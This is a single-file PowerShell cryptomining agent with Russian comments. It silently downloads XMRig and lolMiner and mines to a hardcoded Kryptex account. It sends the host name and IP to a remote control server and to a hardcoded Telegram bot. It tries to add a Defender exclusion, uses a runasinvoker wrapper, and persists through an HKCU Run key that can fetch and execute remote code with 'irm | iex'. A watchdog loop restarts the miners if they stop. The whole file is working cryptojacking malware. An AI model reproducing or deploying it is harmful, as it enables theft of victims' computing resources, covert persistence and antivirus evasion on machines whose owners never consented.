<#
MINING AGENT — WINDOWS (NO-ADMIN, SINGLE-FILE, TG-DEBUG)
Функционал: установка, запуск, автозапуск, watchdog, telemetry, Telegram-отладка
Совместимость: без прав администратора, обход UAC через runasinvoker
API: строго по спецификации (lolipop2018.online)
#>
param(
    [switch]$InstallOnly,
    [switch]$NoWatchdog,
    [switch]$Uninstall,
    [string]$TgToken,      # Опционально: переопределить токен
    [string]$TgChatId      # Опционально: переопределить chat_id
)

# ===== ГЛОБАЛЬНЫЕ НАСТРОЙКИ =====
$ErrorActionPreference = 'SilentlyContinue'
if ($env:ALLOW_MINING -ne "1") { exit 0 }

$HOSTNAME_SHORT = $env:COMPUTERNAME -replace '[^a-zA-Z0-9_-]', '_'
$INTERVAL = 30
$RUN_ID = if ($env:MINING_RUN_ID) { $env:MINING_RUN_ID } else { "run_$(Get-Date -UFormat %s)_$HOSTNAME_SHORT" }
$FIRST_RUN_MARKER = "$env:TEMP\.mining_first_run_$HOSTNAME_SHORT"

# ===== KRYPTEX CONFIG =====
$KRIPTEX = "krxX3PVQVR"
$XMR_POOL = "xmr.kryptex.network:7029"
$ETC_POOL = "etc.kryptex.network:7033"

# ===== API CONFIG =====
$API_BASE = if ($env:API_BASE) { $env:API_BASE } else { "https://lolipop2018.online" }
$AUTH_SESSION = if ($env:AUTH_SESSION) { $env:AUTH_SESSION } else { "_CKU0PGWv9EwWBJmdNJyZDF5AdkJ4KJa2Gv2GV9fVe0" }
$API_TIMEOUT = 15
$API_SKIP_SSL = if ($env:API_SKIP_SSL -eq "0") { $false } else { $true }

# ===== TELEGRAM DEBUG CONFIG =====
$TG_TOKEN = if ($TgToken) { $TgToken } elseif ($env:TG_TOKEN) { $env:TgToken } else { "5466273638:AAF5XEp-3IIgjsgOlV2YauFeSnBlAZeFe5M" }
$TG_CHAT_ID = if ($TgChatId) { $TgChatId } elseif ($env:TG_CHAT_ID) { $env:TG_CHAT_ID } else { "5336452267" }
$TG_ENABLE = if ($env:TG_DEBUG -eq "0") { $false } else { $true }

# ===== CURL DETECT =====
$USE_CURL = $false
if (Get-Command curl.exe -ErrorAction SilentlyContinue) { $USE_CURL = $true }

# ===== PATHS =====
$BASE = if ($env:MINING_BASE) { $env:MINING_BASE } else { "$env:USERPROFILE\.mining" }
$BIN = "$BASE\bin"; $RUN = "$BASE\run"; $LOG = "$BASE\log"
New-Item -Path "$BIN\cpu","$BIN\gpu","$RUN","$LOG" -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null

# ===== GET IP =====
function Get-AgentIP {
    try {
        $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
            $_.IPAddress -notmatch '^127\.|^169\.254\.|^0\.0\.0\.0$'
        } | Select-Object -First 1).IPAddress
        if ($ip) { return $ip }
    } catch {}
    try {
        $ping = Test-Connection -ComputerName "1.1.1.1" -Count 1 -ErrorAction SilentlyContinue
        if ($ping) { return $ping.IPv4Address }
    } catch {}
    return "0.0.0.0"
}
$AGENT_IP = Get-AgentIP

# ===== TELEGRAM SENDER =====
function Send-Tg {
    param([string]$Text, [string]$ParseMode = "HTML")
    if (-not $TG_ENABLE) { return }
    try {
        $url = "https://api.telegram.org/bot$TG_TOKEN/sendMessage"
        $body = @{
            chat_id = $TG_CHAT_ID
            text = $Text
            parse_mode = $ParseMode
            disable_web_page_preview = $true
        } | ConvertTo-Json -Compress
        if ($USE_CURL) {
            $ssl = if ($API_SKIP_SSL) { "-k" } else { "" }
            & curl.exe -s $ssl -X POST $url -H "Content-Type: application/json" -d $body --connect-timeout 5 --max-time 10 | Out-Null
        } else {
            if ($API_SKIP_SSL) { [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } }
            Invoke-RestMethod -Uri $url -Method Post -ContentType "application/json" -Body $body -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
        }
    } catch { Write-Verbose "TG send failed: $_" }
}

function tg_init {
    if (-not $TG_ENABLE) { return }
    # Отправляем только при первом запуске на хосте
    if (-not (Test-Path $FIRST_RUN_MARKER)) {
        $msg = "🟢 <b>MINING AGENT — FIRST RUN</b>`n" +
               "🖥 Хост: <code>$HOSTNAME_SHORT</code>`n" +
               "🌐 IP: <code>$AGENT_IP</code>`n" +
               "🆔 RunID: <code>$RUN_ID</code>`n" +
               "⏱ Время: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n" +
               "🔄 Статус: <b>Инициализация...</b>"
        Send-Tg -Text $msg
        # Маркер первого запуска
        "" | Out-File -FilePath $FIRST_RUN_MARKER -Encoding ascii -Force
    }
}

function tg_status {
    param([string]$Status, [string]$Details = "")
    if (-not $TG_ENABLE) { return }
    $emoji = switch ($Status) {
        "ok" { "✅" }; "warn" { "⚠️" }; "err" { "❌" }; "info" { "ℹ️" }; default { "🔄" }
    }
    $msg = "$emoji <b>$HOSTNAME_SHORT</b> — $Status`n"
    if ($Details) { $msg += "<code>$Details</code>" }
    Send-Tg -Text $msg
}

function tg_error {
    param([string]$Msg)
    if (-not $TG_ENABLE) { return }
    Send-Tg -Text "❌ <b>$HOSTNAME_SHORT</b> — ERROR`n<code>$Msg</code>"
}

# ===== API HELPERS =====
function Invoke-APIPost {
    param($Endpoint, $Json)
    $uri = "$API_BASE$Endpoint"
    $headers = @{ "Content-Type" = "application/json"; "Cookie" = "auth_session=$AUTH_SESSION" }
    try {
        if ($USE_CURL) {
            $ssl = if ($API_SKIP_SSL) { "-k" } else { "" }
            & curl.exe -s $ssl -X POST $uri -H "Content-Type: application/json" `
                -H "Cookie: auth_session=$AUTH_SESSION" -d $Json `
                --connect-timeout 10 --max-time $API_TIMEOUT | Out-Null
        } else {
            if ($API_SKIP_SSL) { [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } }
            Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $Json `
                -TimeoutSec $API_TIMEOUT -ErrorAction SilentlyContinue | Out-Null
        }
    } catch { Write-Verbose "API POST failed: $_" }
}
function api_heartbeat {
    param($Event = "heartbeat", $Message = "")
    $json = @{ username = $HOSTNAME_SHORT; ip = $AGENT_IP; event = $Event }
    if ($Message) { $json.message = $Message }
    if ($RUN_ID) { $json.run_id = $RUN_ID }
    Invoke-APIPost -Endpoint "/api/heartbeat" -Json ($json | ConvertTo-Json -Compress)
}
function api_log {
    param($Message)
    $json = @{ username = $HOSTNAME_SHORT; ip = $AGENT_IP; message = $Message }
    if ($RUN_ID) { $json.run_id = $RUN_ID }
    Invoke-APIPost -Endpoint "/api/logs/push" -Json ($json | ConvertTo-Json -Compress)
}

# ===== RUNAS INVOKER WRAPPER =====
$WRAPPER = "$BASE\runas.bat"
if (-not (Test-Path $WRAPPER)) {
    $bat = @"
@echo off
setlocal
set "__COMPAT_LAYER=runasinvoker"
set "TARGET=%~1"
shift
set "ARGS=%*"
start /min /b "" cmd /c "%TARGET%" %ARGS%
exit /b 0
"@
    $bat | Out-File -FilePath $WRAPPER -Encoding ascii -Force
}

# ===== INSTALLERS =====
function Install-XMRig {
    api_log "Installing XMRig"; tg_status "info" "Installing XMRig..."
    Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
    $target = "$BIN\cpu\xmrig.exe"
    if (Test-Path $target) { Remove-Item $target -Force }
    $urls = @(
        "https://xmrig.com/download/xmrig-6.25.0-msvc-win64.zip",
        "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-msvc-win64.zip"
    )
    foreach ($url in $urls) {
        try {
            $tmp = "$env:TEMP\xmrig.zip"
            if ($USE_CURL) {
                $ssl = if ($API_SKIP_SSL) { "-k" } else { "" }
                & curl.exe -s -L $ssl $url -o $tmp --connect-timeout 10 --max-time 60
            } else {
                Invoke-WebRequest -Uri $url -OutFile $tmp -UseBasicParsing -TimeoutSec 60
            }
            if (Test-Path $tmp) {
                Expand-Archive -Path $tmp -DestinationPath "$BIN\cpu" -Force
                Move-Item "$BIN\cpu\xmrig-6.25.0\xmrig.exe" $target -Force
                Remove-Item "$BIN\cpu\xmrig-6.25.0" -Recurse -Force -ErrorAction SilentlyContinue
                Remove-Item $tmp -Force
                if (Test-Path $target) { api_log "XMRig installed"; tg_status "ok" "XMRig installed"; return $true }
            }
        } catch { tg_error "XMRig download: $_" }
    }
    api_log "ERROR: XMRig install failed"; tg_error "XMRig install failed"; return $false
}

function Install-LolMiner {
    api_log "Installing lolMiner"; tg_status "info" "Installing lolMiner..."
    Stop-Process -Name "lolMiner" -Force -ErrorAction SilentlyContinue
    $target = "$BIN\gpu\lolMiner.exe"
    if (Test-Path $target) { Remove-Item $target -Force }
    $url = "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Win64.zip"
    try {
        $tmp = "$env:TEMP\lolminer.zip"
        if ($USE_CURL) {
            $ssl = if ($API_SKIP_SSL) { "-k" } else { "" }
            & curl.exe -s -L $ssl $url -o $tmp --connect-timeout 10 --max-time 60
        } else {
            Invoke-WebRequest -Uri $url -OutFile $tmp -UseBasicParsing -TimeoutSec 60
        }
        if (Test-Path $tmp) {
            Expand-Archive -Path $tmp -DestinationPath "$BIN\gpu" -Force
            $srcDir = Get-ChildItem "$BIN\gpu" -Directory | Where-Object { $_.Name -like "lolMiner_v*" } | Select-Object -First 1
            if ($srcDir) { Move-Item "$($srcDir.FullName)\lolMiner.exe" $target -Force; Remove-Item $srcDir.FullName -Recurse -Force -ErrorAction SilentlyContinue }
            Remove-Item $tmp -Force
            if (Test-Path $target) { api_log "lolMiner installed"; tg_status "ok" "lolMiner installed"; return $true }
        }
    } catch { tg_error "lolMiner: $_" }
    api_log "ERROR: lolMiner install failed"; tg_error "lolMiner install failed"; return $false
}

# ===== MINERS START =====
function Start-CPUMiner {
    Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
    $args = "-o $XMR_POOL -u $KRIPTEX.$HOSTNAME_SHORT -p x --http-enabled --http-host 127.0.0.1 --http-port 16000"
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "`"$WRAPPER`" `"$BIN\cpu\xmrig.exe`" $args" `
        -NoNewWindow -RedirectStandardOutput "$LOG\cpu.log" -RedirectStandardError "$LOG\cpu.log"
    Start-Sleep -Seconds 2
    $proc = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($proc) { $proc.Id | Out-File "$RUN\cpu.pid" -Encoding ascii; tg_status "ok" "CPU miner started (PID $($proc.Id))"; return $true }
    tg_error "CPU miner failed to start"; return $false
}

function Start-GPUMiner {
    Stop-Process -Name "lolMiner" -Force -ErrorAction SilentlyContinue
    $args = "--algo ETCHASH --pool $ETC_POOL --user $KRIPTEX.$HOSTNAME_SHORT --ethstratum ETCPROXY --apihost 127.0.0.1 --apiport 8080"
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c", "`"$WRAPPER`" `"$BIN\gpu\lolMiner.exe`" $args" `
        -NoNewWindow -RedirectStandardOutput "$LOG\gpu.log" -RedirectStandardError "$LOG\gpu.log"
    Start-Sleep -Seconds 2
    $proc = Get-Process -Name "lolMiner" -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($proc) { $proc.Id | Out-File "$RUN\gpu.pid" -Encoding ascii; tg_status "ok" "GPU miner started (PID $($proc.Id))"; return $true }
    tg_error "GPU miner failed to start"; return $false
}

# ===== HASHRATE READERS =====
function Get-CPUHashrate {
    try {
        $resp = if ($USE_CURL) {
            & curl.exe -s "http://127.0.0.1:16000/1/summary" --connect-timeout 5 --max-time 5
        } else {
            Invoke-RestMethod -Uri "http://127.0.0.1:16000/1/summary" -TimeoutSec 5 -ErrorAction SilentlyContinue
        }
        if ($resp -is [string]) { $resp = $resp | ConvertFrom-Json -ErrorAction SilentlyContinue }
        return $resp.hashrate.total 2>$null | ForEach-Object { [math]::Round($_, 2) } | Select-Object -First 1
    } catch { return 0 }
    return 0
}
function Get-GPUHashrate {
    try { {
        $resp = if ($USE_CURL) {
            & curl.exe -s "http://127.0.0.1:8080/summary" --connect-timeout 5 --max-time 5
        } else {
            Invoke-RestMethod -Uri "http://127.0.0.1:8080/summary" -TimeoutSec 5 -ErrorAction SilentlyContinue
        }
        if ($resp -is [string]) { $resp = $resp | ConvertFrom-Json -ErrorAction SilentlyContinue }
        return $resp.Performance 2>$null | Select-Object -First 1
    } } catch { return 0 }
    return 0
}

# ===== AV EXCLUSION ATTEMPT =====
function Try-AddExclusion {
    try {
        $defender = Get-MpPreference -ErrorAction SilentlyContinue
        if ($defender -and ($defender.ExclusionPath -notcontains $BASE)) {
            Add-MpPreference -ExclusionPath $BASE -ErrorAction SilentlyContinue | Out-Null
            api_log "Attempted Defender exclusion for $BASE"
        }
    } catch {
        api_log "NOTE: AV exclusion requires admin"
    }
}

# ===== AUTOSTART (HKCU\Run) =====
function Ensure-Autostart {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $taskName = "MiningAgent_$HOSTNAME_SHORT"
    $scriptUrl = $env:MINING_SCRIPT_URL
    if ($scriptUrl) {
        $cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"irm '$scriptUrl' | iex`""
        New-ItemProperty -Path $regPath -Name $taskName -Value $cmd -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
    } else {
        $localPath = $MyInvocation.MyCommand.Path
        if ($localPath) {
            $cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$localPath`""
            New-ItemProperty -Path $regPath -Name $taskName -Value $cmd -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
        }
    }
    api_log "Autostart configured via HKCU\Run"
}

# ===== UNINSTALL =====
function Do-Uninstall {
    api_heartbeat -Event "agent_stop" -Message "Uninstalling on $HOSTNAME_SHORT"
    tg_status "warn" "Uninstalling..."
    Stop-Process -Name "xmrig","lolMiner" -Force -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
        -Name "MiningAgent_$HOSTNAME_SHORT" -ErrorAction SilentlyContinue
    Remove-Item $BASE -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $FIRST_RUN_MARKER -Force -ErrorAction SilentlyContinue
    api_log "Uninstall complete"; tg_status "ok" "Uninstall complete"
    exit 0
}

# ===== MAIN =====
tg_init  # Первое уведомление
if ($Uninstall) { Do-Uninstall }

$CPU_OK = $false; $GPU_OK = $false
api_heartbeat -Event "agent_init" -Message "Mining agent starting on ${HOSTNAME_SHORT}"
tg_status "info" "Agent init on $HOSTNAME_SHORT ($AGENT_IP)"

Try-AddExclusion
$CPU_OK = Install-XMRig
$GPU_OK = Install-LolMiner
Ensure-Autostart

$CPU_STARTED = $false; $GPU_STARTED = $false
if ($CPU_OK) { $CPU_STARTED = Start-CPUMiner } else { tg_error "CPU install failed" }
if ($GPU_OK) { $GPU_STARTED = Start-GPUMiner } else { tg_error "GPU install failed" }

if ($CPU_STARTED -or $GPU_STARTED) {
    api_heartbeat -Event "mining_started" -Message "CPU=$($CPU_STARTED?1:0) GPU=$($GPU_STARTED?1:0)"
    tg_status "ok" "Mining started — CPU:$($CPU_STARTED) GPU:$($GPU_STARTED)"
} else {
    api_heartbeat -Event "mining_failed" -Message "No miners started"
    tg_error "Mining failed — no miners could start"
    if (-not $InstallOnly) { exit 1 }
}

if ($InstallOnly -or $NoWatchdog) { tg_status "info" "Exiting (InstallOnly/NoWatchdog)"; exit 0 }

# ===== WATCHDOG LOOP =====
while ($true) {
    if ($CPU_OK) {
        $proc = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue | Select-Object -First 1
        if (-not $proc) { Start-CPUMiner | Out-Null; tg_status "warn" "WATCHDOG: CPU restarted" }
    }
    if ($GPU_OK) {
        $proc = Get-Process -Name "lolMiner" -ErrorAction SilentlyContinue | Select-Object -First 1
        if (-not $proc) { Start-GPUMiner | Out-Null; tg_status "warn" "WATCHDOG: GPU restarted" }
    }
    if ($GPU_OK) {
        $hr = Get-GPUHashrate
        if ($hr -and ($hr -eq 0 -or $hr -lt 0.1)) { Start-GPUMiner | Out-Null; tg_status "warn" "WATCHDOG: GPU low hashrate" }
    }
    $cpu_hr = Get-CPUHashrate; $gpu_hr = Get-GPUHashrate
    api_heartbeat -Event "watchdog_tick" -Message "CPU=${cpu_hr}H/s GPU=${gpu_hr}MH/s"
    Start-Sleep -Seconds $INTERVAL
}
